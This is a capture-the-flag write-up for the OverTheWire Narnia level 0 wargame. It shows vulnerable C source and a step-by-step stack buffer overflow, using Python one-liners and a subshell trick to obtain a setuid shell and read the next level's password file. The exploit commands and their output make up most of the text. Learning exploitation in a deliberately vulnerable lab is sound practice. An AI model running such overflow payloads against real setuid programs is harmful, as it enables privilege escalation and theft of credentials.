
#Narnia0

narnia.labs.overthewire.org

**Username:** narnia0
**Password:** narnia0
**Description:**  

This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

Before we do anything, let's go ahead and run the program and see what it does.

```
# ./narnia0  
Correct val's value from 0x41414141 -> 0xdeadbeef!  
Here is your chance: AAAAAAAA  
buf: AAAAAAAA  
val: 0x41414141  
WAY OFF!!!!  
```

Ok, it basically just tell's us that we need to correct a value and asks for input.  After accepting the input it looks like it just tells us the value that we submitted and the value of the area we are supposed to overwrite.

Let's go ahead and take a peek at the source:

```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```

Alright, we can see the declaration of the buffer ```char buf[20];``` and where the input is read in ```scanf("%24s",&buf);```.  It also looks like if we get our values correct that we will be rewarded quite generously with a shell.  How nice! Let's play around with this new information a bit.  If the buffer was only supposed to be 20 characters, let's see what happens when our input is 21 characters, but since it looks like the buffer we want to overwrite has ```0x41414141``` already in it we are going to have to use another letter besides ```A``` as our input. We'll settle for ```R```.  Just as a quick side note, rather than inputting the values by hand each time let's utilize python to make life easier and just pipe in the input.

```
# python -c 'print "R"*21' | ./narnia0  
Correct val's value from 0x41414141 -> 0xdeadbeef!  
Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRR  
val: 0x41410052  
WAY OFF!!!!  
```

Hmm, it looks like we overwrote one character with the null value at the end of the input overwriting a second.  It also looks like it started overwriting from the back, so we'll need to remember to take the endianness into account for our final input.  Let's try overwriting all 4 characters of the buffer.

```
# python -c 'print "R"*24' | ./narnia0  
Correct val's value from 0x41414141 -> 0xdeadbeef!  
Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRRRRR  
val: 0x52525252  
WAY OFF!!!!  
```

Perfect, we overwrote the whole buffer with our input.  Now, lets start trying to fit ```0xdeadbeef``` in there.  Since the hex values for ```0xdeadbeef``` don't match up to ascii characters we need a way to insert them as input.  We are already using python for the repetitive input, let's just back off our number of ```R``` and tag on hex values to the end of that string and see what it does.

```
# python -c 'print "R"*20+"\xde\xad\xbe\xef"' | ./narnia0  
Correct val's value from 0x41414141 -> 0xdeadbeef!  
Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRޭ�  
val: 0xefbeadde  
WAY OFF!!!!  
```
Our buffer shows that we inserted ```RRRRRRRRRRRRRRRRRRRRޭ�``` which we obviously wouldn't have been able to type in.  However, we forget about the little endian part and our values aren't in the correct order.  Let's fix that.

```
# python -c 'print "R"*20+"\xef\xbe\xad\xde"' | ./narnia0  
Correct val's value from 0x41414141 -> 0xdeadbeef!  
Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRﾭ  
val: 0xdeadbeef  
```

Well, we didn't get the ```WAY OFF!!!``` message, but no shell. I actually spent a good bit of time at this stage, but learned a few key concepts in doing so.  The shell is being launched, but the problem is that it's exiting before we have a chance to run anything.  What we need to do is use the subshell syntax in bash and try to group commands together.  Let's try that with a basic command.
 
```
narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"';ls) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
/bin/sh: 1: narnia0: not found
/bin/sh: 2: narnia0.c: not found
/bin/sh: 3: narnia1: not found
/bin/sh: 4: narnia1.c: not found
/bin/sh: 5: narnia2: not found
/bin/sh: 6: narnia2.c: not found
/bin/sh: 7: narnia3: not found
/bin/sh: 8: narnia3.c: not found
/bin/sh: 9: narnia4: not found
/bin/sh: 10: narnia4.c: not found
/bin/sh: 11: narnia5: not found
/bin/sh: 12: narnia5.c: not found
/bin/sh: 13: narnia6: not found
/bin/sh: 14: narnia6.c: not found
/bin/sh: 15: narnia7: not found
/bin/sh: 16: narnia7.c: not found
/bin/sh: 17: narnia8: not found
/bin/sh: 18: narnia8.c: not found
```

Now this looks a little better.  It looks like the output from ```ls``` was passed into the /bin/sh from narnia0. Here we can utilize the ```cat``` command with no parameters which will basically leave the input open for us to pass values to /bin/sh.

```
narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"';cat) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
whoami
narnia1
pwd 
/narnia
```

Finally. The ```cat``` command left the input open for us and everything we passed was executed by /bin/sh as a separate command.  Now we just need to find where the flag may be.

```
narnia0@melinda:/narnia$ find / -name 'narnia*' -print 2>/dev/null
/games/narnia
/games/narnia/narnia8
/games/narnia/narnia6.c
/games/narnia/narnia6
/games/narnia/narnia3
/games/narnia/narnia7
/games/narnia/narnia4
/games/narnia/narnia2.c
/games/narnia/narnia3.c
/games/narnia/narnia1
/games/narnia/narnia5
/games/narnia/narnia4.c
/games/narnia/narnia5.c
/games/narnia/narnia0
/games/narnia/narnia2
/games/narnia/narnia1.c
/games/narnia/narnia7.c
/games/narnia/narnia8.c
/games/narnia/narnia0.c
/etc/narnia_pass
/etc/narnia_pass/narnia3
/etc/narnia_pass/narnia7
/etc/narnia_pass/narnia5
/etc/narnia_pass/narnia1
/etc/narnia_pass/narnia8
/etc/narnia_pass/narnia6
/etc/narnia_pass/narnia9
/etc/narnia_pass/narnia0
/etc/narnia_pass/narnia2
/etc/narnia_pass/narnia4
/narnia
/home/narnia3
/home/narnia7
/home/narnia5
/home/narnia1
/home/narnia8
/home/narnia6
/home/narnia9
/home/narnia0
/home/narnia2
/home/narnia4
```

The ```find / -name 'narnia*'``` is a fairly basic command.  The ```-print 2>/dev/null``` is basically just there to eliminate any errors that may clutter the output.  Out of our results the most promising is the ```/etc/narnia_pass``` directory that looks like there is a password document for each challenge.  Since we already have the password for narnia0, let's try to grab the narnia1 password.

```
narnia0@melinda:/narnia$ cat /etc/narnia_pass/narnia1
cat: /etc/narnia_pass/narnia1: Permission denied
narnia0@melinda:/narnia$ ls -l /etc/narnia_pass/narnia1
-r-------- 1 narnia1 narnia1 11 Nov 14  2014 /etc/narnia_pass/narnia1
narnia0@melinda:/narnia$ ls -l narnia0
-r-sr-x--- 1 narnia1 narnia0 7452 Nov 14  2014 narnia0
```

We can't just ```cat``` the narnia1 password because we don't have permissions but it looks like the narnia0 challege runs under narnia1.  Let's use our subshell trick and try to read the password.

```
narnia0@melinda:/narnia$ (python -c 'print "A"*20+"\xef\xbe\xad\xde"';cat) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
cat /etc/narnia_pass/narnia1
**********
```

There we go. Finally got it. On to narnia1.
